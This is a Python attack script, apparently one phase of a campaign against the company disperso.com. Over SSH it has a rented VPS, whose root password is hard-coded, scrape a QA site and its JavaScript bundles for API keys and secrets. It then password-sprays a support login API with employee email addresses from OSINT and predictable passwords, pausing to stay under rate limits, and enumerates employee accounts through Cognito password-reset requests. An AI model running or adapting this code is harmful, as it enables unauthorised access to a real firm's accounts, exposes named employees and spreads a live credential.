"""Phase 5: QA Docusaurus docs extraction + soporte spray from FRESH VPS."""
import paramiko, textwrap

# FRESH VPS (never touched disperso)
VPS = "216.238.75.117"
PW = r"]Aq9mngH(_%ZV%jn"

REMOTE = textwrap.dedent(r'''
import json, urllib.request, urllib.error, ssl, time, re

ctx = ssl._create_unverified_context()

def req(url, data=None, headers=None, method=None, timeout=20):
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}
    if headers:
        hdrs.update(headers)
    if isinstance(data, dict):
        data = json.dumps(data).encode()
    elif isinstance(data, str):
        data = data.encode()
    r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        body = resp.read()
        return resp.status, body, dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read()
        return e.code, body, dict(e.headers)
    except Exception as e:
        return 0, str(e).encode(), {}

QA = "https://landing.qa.disperso.com"

# ======================================================
print("=" * 60)
print("1. QA LANDING — FULL HTML EXTRACTION")
print("=" * 60)

s, b, h = req(f"{QA}/")
html = b.decode(errors="replace")
print(f"  Root: {s} ({len(b)}b)")
print(f"  Full HTML:\n{html}")

# Extract JS/CSS references
scripts = re.findall(r'src="([^"]+)"', html)
styles = re.findall(r'href="([^"]+\.css[^"]*)"', html)
links = re.findall(r'href="([^"]+)"', html)
print(f"\n  Scripts: {scripts}")
print(f"  Styles: {styles}")
print(f"  Links: {links}")

# ======================================================
print("\n" + "=" * 60)
print("2. QA DOCUSAURUS — FIND REAL DOCS")
print("=" * 60)

# Docusaurus typical paths
doc_paths = [
    "/docs", "/docs/", "/docs/index.html",
    "/docs/en", "/docs/en/", "/docs/en/index.html",
    "/docs/en/api", "/docs/en/api/", "/docs/en/api/index.html",
    "/docs/en/api.html",
    "/docs/api", "/docs/api/", "/docs/api/index.html",
    "/docs/intro", "/docs/intro/",
    "/docs/getting-started", "/docs/getting-started/",
    "/docs/authentication", "/docs/authentication/",
    "/docs/guides", "/docs/guides/",
    "/docs/reference", "/docs/reference/",
    "/docs/es", "/docs/es/", "/docs/es/api",
    "/docs/sidebar.json", "/docs/sidebars.json",
    "/docs/search-index.json",
    # Docusaurus build artifacts
    "/search-index.json",
    "/sitemap.xml",
    "/blog", "/blog/",
    "/assets/js/", "/assets/css/",
    "/img/", "/static/",
]

for p in doc_paths:
    s, b, h = req(f"{QA}{p}")
    ct = h.get("content-type", "")
    sz = len(b)
    # Skip SPA catch-all (3358b HTML)
    if sz != 3358 or "json" in ct or "xml" in ct:
        print(f"  {p} -> {s} ({sz}b) {ct[:40]}")
        if sz < 5000 and "html" not in ct and sz > 0:
            print(f"    {b[:500].decode(errors='replace')}")
    time.sleep(0.2)

# ======================================================
print("\n" + "=" * 60)
print("3. QA — JS BUNDLE ANALYSIS")
print("=" * 60)

# Download main JS
for script_url in scripts:
    if script_url.startswith("/"):
        full = f"{QA}{script_url}"
    elif script_url.startswith("http"):
        full = script_url
    else:
        full = f"{QA}/{script_url}"
    
    s, b, h = req(full)
    if s == 200 and len(b) > 1000:
        content = b.decode(errors="replace")
        print(f"\n  {script_url}: {len(b):,} bytes")
        
        # Search for interesting patterns
        for kw in ["apiKey", "api_key", "API_KEY", "secret", "password", "token",
                    "cognito", "amazonaws", "execute-api", "disperso.com",
                    "BASE_URL", "API_URL", "REACT_APP", "VITE_", "env."]:
            matches = re.findall(rf'.{{0,60}}{re.escape(kw)}.{{0,60}}', content, re.IGNORECASE)
            if matches:
                print(f"    [{kw}]:")
                for m in matches[:3]:
                    print(f"      {m.strip()[:120]}")
    time.sleep(0.3)

# ======================================================
print("\n" + "=" * 60)
print("4. SOPORTE SPRAY (FRESH IP - 13 emails x 3 passwords)")
print("=" * 60)

SOP = "https://soporte.disperso.com"

emails = [
    # Confirmed/high confidence
    "sales@disperso.com",
    "soporte@disperso.com",
    "admin@disperso.com",
    # From Tuxpan naming -> Disperso inferred
    "casep@disperso.com",
    "fcatrin@disperso.com",
    "garate@disperso.com",
    "maureira@disperso.com",
    "maurro@disperso.com",
    "mfiguerc@disperso.com",
    "mmoossen@disperso.com",
    "mnavea@disperso.com",
    "smacias@disperso.com",
    # LinkedIn OSINT
    "perazo@disperso.com",
    "sulloa@disperso.com",
    "dcanales@disperso.com",
    "jzamora@disperso.com",
    "patricia.erazo@disperso.com",
    "sandra.ulloa@disperso.com",
]

# Common weak passwords for Chilean fintech
passwords = [
    "Disperso2024!", "Disperso2025!", "Disperso2026!",
    "Tuxpan2024!", "Tuxpan2025!", "Tuxpan2026!",
    "Admin2024!", "Admin2025!", "Admin2026!",
    "Password1!", "Soporte123!",
]

print(f"  Emails: {len(emails)}, Passwords: {len(passwords)}")
print(f"  Total combos: {len(emails) * len(passwords)}")
print(f"  Strategy: 3 per batch, 2s between, check for 429")
print()

batch = 0
hit = False
for email in emails:
    if hit:
        break
    for pwd in passwords:
        if hit:
            break
        batch += 1
        
        # Rate limit: 3 attempts then wait
        if batch > 1 and batch % 3 == 1:
            time.sleep(3)
        
        t0 = time.time()
        s, b, h = req(f"{SOP}/api/auth/login",
                      data={"email": email, "password": pwd},
                      headers={"Content-Type": "application/json"})
        dt = time.time() - t0
        
        msg = ""
        try:
            d = json.loads(b)
            msg = d.get("message", "")[:80]
        except:
            msg = b[:80].decode(errors="replace")
        
        if s == 429:
            print(f"  !!! RATE LIMITED at batch {batch} — {msg}")
            print(f"  STOPPING SPRAY (save remaining attempts for later)")
            break
        elif s == 200:
            print(f"  !!!!! HIT: {email} / {pwd} -> {s} ({len(b)}b)")
            print(f"  BODY: {b[:500].decode(errors='replace')}")
            hit = True
        elif s == 401:
            pass  # Expected, keep going
        else:
            print(f"  UNEXPECTED: {email} -> {s} ({len(b)}b) {msg}")
        
        time.sleep(1.5)
    
    if s == 429:
        break

if not hit:
    print(f"\n  Tested {batch} combos, no hit. Rate limit may have cut short.")

# ======================================================
print("\n" + "=" * 60)
print("5. COGNITO FORGOTPASSWORD (employee emails - FIXED)")
print("=" * 60)

COGNITO = "https://cognito-idp.us-east-2.amazonaws.com/"
CLIENT = "4fjbm9cornhgfqk4o8m33rjt2f"

cogn_emails = [
    "perazo@disperso.com",
    "patricia.erazo@disperso.com",
    "sulloa@disperso.com",
    "admin@disperso.com",
    "soporte@disperso.com",
    "sales@disperso.com",
    "casep@disperso.com",
    "fcatrin@disperso.com",
    "garate@disperso.com",
]

for email in cogn_emails:
    body = json.dumps({"ClientId": CLIENT, "Username": email}).encode()
    s, b, h = req(COGNITO, data=body, headers={
        "Content-Type": "application/x-amz-json-1.1",
        "X-Amz-Target": "AWSCognitoIdentityProviderService.ForgotPassword"
    })
    msg = b[:200].decode(errors="replace")
    tag = "!!!" if "CodeDelivery" in msg else ""
    print(f"  {tag} {email:40s} -> {s} {msg[:120]}")
    time.sleep(2)

# ======================================================
print("\n" + "=" * 60)
print("6. CRT.SH (retry)")
print("=" * 60)

s, b, h = req("https://crt.sh/?q=%25.disperso.com&output=json", timeout=30)
if s == 200:
    try:
        certs = json.loads(b)
        names = set()
        for c in certs:
            cn = c.get("common_name","")
            if cn: names.add(cn)
            san = c.get("name_value","")
            for n in san.split("\n"):
                n = n.strip()
                if n: names.add(n)
        print(f"  {len(certs)} certs, {len(names)} unique names:")
        for n in sorted(names):
            print(f"    {n}")
    except Exception as e:
        print(f"  Parse: {e}")
else:
    print(f"  crt.sh: {s} ({len(b)}b)")

print("\n" + "=" * 60)
print("PHASE 5 DONE")
print("=" * 60)
''')

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(VPS, username="root", password=PW, timeout=15)
sftp = ssh.open_sftp()
with sftp.file("/tmp/todo5.py", "w") as f:
    f.write(REMOTE)
sftp.close()
print(f"Connected {VPS}, running phase 5...")
stdin, stdout, stderr = ssh.exec_command("python3 /tmp/todo5.py 2>&1", timeout=600)
out = stdout.read().decode(errors="replace")
print(out)
ssh.close()
